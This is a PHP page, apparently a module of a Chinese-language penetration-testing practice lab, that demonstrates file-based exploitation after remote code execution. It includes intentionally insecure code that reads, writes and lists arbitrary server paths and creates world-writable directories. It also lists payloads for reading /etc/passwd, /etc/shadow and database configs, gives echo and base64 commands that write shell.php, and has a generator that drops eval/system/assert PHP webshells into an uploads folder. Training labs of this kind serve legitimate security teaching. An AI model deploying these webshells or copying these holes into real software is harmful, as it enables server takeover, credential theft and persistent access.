<div class="panel fade-in">
    <div class="level-info">
        <span class="level-dot medium"></span>
        <span class="badge badge-medium">中等</span>
        <h2 style="margin:0">📂 文件读写利用</h2>
    </div>

    <div class="alert alert-info">
        <strong>📖 模块说明：</strong>模拟通过RCE写入WebShell、读取敏感文件、列目录等操作。
        这是渗透测试中权限维持和横向移动的关键技术。
    </div>

    <!-- 功能选择 -->
    <div style="display:flex;gap:10px;margin-bottom:1.5rem;flex-wrap:wrap;">
        <a href="?page=file_rw&action=read" class="submit-btn <?php echo ($_GET['action']??'')=='read'?'success':''; ?>">📖 读取文件</a>
        <a href="?page=file_rw&action=write" class="submit-btn <?php echo ($_GET['action']??'')=='write'?'warning':''; ?>">✏️ 写入文件</a>
        <a href="?page=file_rw&action=list" class="submit-btn <?php echo ($_GET['action']??'')=='list'?'info':''; ?>">📁 列目录</a>
        <a href="?page=file_rw&action=webshell" class="submit-btn <?php echo ($_GET['action']??'')=='webshell'?'danger':''; ?>">🐚 WebShell</a>
    </div>

    <?php
    $action = $_GET['action'] ?? 'read';

    if ($action === 'read'): ?>
        <h3>📖 读取文件</h3>
        <form method="POST">
            <input type="hidden" name="action" value="read">
            <div class="form-group">
                <label for="read_path">文件路径：</label>
                <div class="form-row">
                    <input type="text" name="file_path" id="read_path" 
                           placeholder="/etc/passwd 或 C:\windows\win.ini"
                           value="<?php echo htmlspecialchars($_POST['file_path'] ?? '/etc/passwd'); ?>">
                    <button type="submit" name="file_submit" class="submit-btn">读取 🔍</button>
                </div>
            </div>
        </form>

        <?php
        if (isset($_POST['file_submit'])) {
            $path = $_POST['file_path'];
            echo '<div class="output-section">';
            echo '<h4>文件内容：' . htmlspecialchars($path) . '</h4>';
            echo '<div class="output-box">';
            if (file_exists($path) && is_readable($path)) {
                echo htmlspecialchars(file_get_contents($path));
            } else {
                echo '<span class="error">文件不存在或不可读</span>';
            }
            echo '</div>';
            echo '</div>';
        }
        ?>

        <div class="tip-collapse">
            <div class="tip-header" onclick="this.nextElementSibling.classList.toggle('show')">
                💡 读取文件常用Payload
            </div>
            <div class="tip-content">
                <ul class="payload-list">
                    <li><code>cat /etc/passwd</code> - Linux用户文件</li>
                    <li><code>cat /etc/shadow</code> - Linux密码哈希</li>
                    <li><code>cat /etc/hosts</code> - 主机映射</li>
                    <li><code>cat /var/www/html/config.php</code> - 数据库配置</li>
                    <li><code>type C:\windows\win.ini</code> - Windows</li>
                    <li><code>more C:\Users\Administrator\flag.txt</code></li>
                </ul>
            </div>
        </div>

    <?php elseif ($action === 'write'): ?>
        <h3>✏️ 写入文件</h3>
        <div class="alert alert-danger">
            <strong>⚠️ 注意：</strong>以下演示写入文件的功能。实际攻击中常用于写入WebShell或修改配置文件
            实现权限维持。
        </div>
        <form method="POST">
            <input type="hidden" name="action" value="write">
            <div class="form-group">
                <label for="write_path">目标路径：</label>
                <input type="text" name="write_path" id="write_path" 
                       placeholder="uploads/test.txt"
                       value="<?php echo htmlspecialchars($_POST['write_path'] ?? 'uploads/test.txt'); ?>">
            </div>
            <div class="form-group">
                <label for="write_content">文件内容：</label>
                <textarea name="write_content" id="write_content" rows="5" 
                          placeholder="输入要写入的内容"><?php echo htmlspecialchars($_POST['write_content'] ?? ''); ?></textarea>
            </div>
            <button type="submit" name="write_submit" class="submit-btn warning">写入文件 ✏️</button>
        </form>

        <?php
        if (isset($_POST['write_submit'])) {
            $w_path = $_POST['write_path'];
            $w_content = $_POST['write_content'];
            $w_dir = dirname($w_path);
            
            if (!is_dir($w_dir)) {
                mkdir($w_dir, 0777, true);
            }
            
            if (file_put_contents($w_path, $w_content) !== false) {
                echo '<div class="alert alert-success">';
                echo '<strong>✅ 写入成功！</strong> 文件: ' . htmlspecialchars($w_path);
                echo ' (' . strlen($w_content) . ' bytes)';
                echo '</div>';
            } else {
                echo '<div class="alert alert-danger">写入失败！</div>';
            }
        }
        ?>

        <div class="tip-collapse">
            <div class="tip-header" onclick="this.nextElementSibling.classList.toggle('show')">
                💡 写文件常用技巧
            </div>
            <div class="tip-content">
                <ul class="payload-list">
                    <li><code>echo '&lt;?php system(\$_GET["cmd"]); ?>' > shell.php</code></li>
                    <li><code>printf '<?php system($_GET["cmd"]);?>' > shell.php</code></li>
                    <li><code>echo "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==" | base64 -d > shell.php</code></li>
                    <li><code>cat > shell.php <<EOF &lt;?php system(\$_GET['cmd']); ?> EOF</code></li>
                </ul>
            </div>
        </div>

    <?php elseif ($action === 'list'): ?>
        <h3>📁 列目录</h3>
        <form method="POST">
            <input type="hidden" name="action" value="list">
            <div class="form-group">
                <label for="list_path">目录路径：</label>
                <div class="form-row">
                    <input type="text" name="list_path" id="list_path" 
                           placeholder="."
                           value="<?php echo htmlspecialchars($_POST['list_path'] ?? '.'); ?>">
                    <button type="submit" name="list_submit" class="submit-btn">列出 📂</button>
                </div>
            </div>
        </form>

        <?php
        if (isset($_POST['list_submit'])) {
            $l_path = $_POST['list_path'];
            echo '<div class="output-section">';
            echo '<h4>目录：' . htmlspecialchars($l_path) . '</h4>';
            echo '<div class="output-box">';
            
            if (is_dir($l_path)) {
                $files = scandir($l_path);
                foreach ($files as $file) {
                    $full = $l_path . DIRECTORY_SEPARATOR . $file;
                    $type = is_dir($full) ? '[DIR]' : '[FILE]';
                    $size = is_file($full) ? ' (' . filesize($full) . ' bytes)' : '';
                    $class = is_dir($full) ? 'info' : '';
                    echo '<span class="' . $class . '">' . htmlspecialchars($type . ' ' . $file . $size) . "</span>\n";
                }
            } else {
                echo '<span class="error">目录不存在</span>';
            }
            
            echo '</div>';
            echo '</div>';
        }
        ?>

    <?php elseif ($action === 'webshell'): ?>
        <h3>🐚 WebShell 生成</h3>
        <div class="alert alert-danger">
            <strong>⚠️ 仅供学习研究！</strong> 了解WebShell的生成方式有助于防御和检测。
        </div>

        <div class="source-code">
            <h4>经典一句话WebShell：</h4>
            <pre><span class="php">&lt;?php @eval($_POST['cmd']); ?&gt;</span></pre>
            <pre><span class="php">&lt;?php @system($_GET['cmd']); ?&gt;</span></pre>
            <pre><span class="php">&lt;?php @assert($_POST['cmd']); ?&gt;</span></pre>
        </div>

        <form method="POST">
            <input type="hidden" name="action" value="webshell">
            <div class="form-group">
                <label>选择WebShell类型：</label>
                <select name="shell_type">
                    <option value="eval">eval($_POST['cmd'])</option>
                    <option value="system">system($_GET['cmd'])</option>
                    <option value="assert">assert($_POST['cmd'])</option>
                    <option value="file_put">file_put_contents 写入</option>
                </select>
            </div>
            <div class="form-group">
                <label for="shell_filename">文件名：</label>
                <input type="text" name="shell_filename" id="shell_filename" value="shell.php">
            </div>
            <button type="submit" name="shell_submit" class="submit-btn danger">生成WebShell ⚡</button>
        </form>

        <?php
        if (isset($_POST['shell_submit'])) {
            $type = $_POST['shell_type'];
            $filename = $_POST['shell_filename'];
            
            $code_map = [
                'eval' => '<?php @eval($_POST[\'cmd\']); ?>',
                'system' => '<?php @system($_GET[\'cmd\']); ?>',
                'assert' => '<?php @assert($_POST[\'cmd\']); ?>',
                'file_put' => '<?php file_put_contents($_POST["f"], $_POST["c"]); ?>'
            ];
            
            $shell_code = $code_map[$type] ?? $code_map['eval'];
            
            if (file_put_contents('uploads/' . $filename, $shell_code) !== false) {
                echo '<div class="alert alert-success">';
                echo '<strong>✅ WebShell 生成成功！</strong><br>';
                echo '路径: <code>uploads/' . htmlspecialchars($filename) . '</code><br>';
                echo '用法: POST参数 cmd=system("whoami");<br>';
                echo '内容: <code>' . htmlspecialchars($shell_code) . '</code>';
                echo '</div>';
            }
        }
        ?>
    <?php endif; ?>
</div>
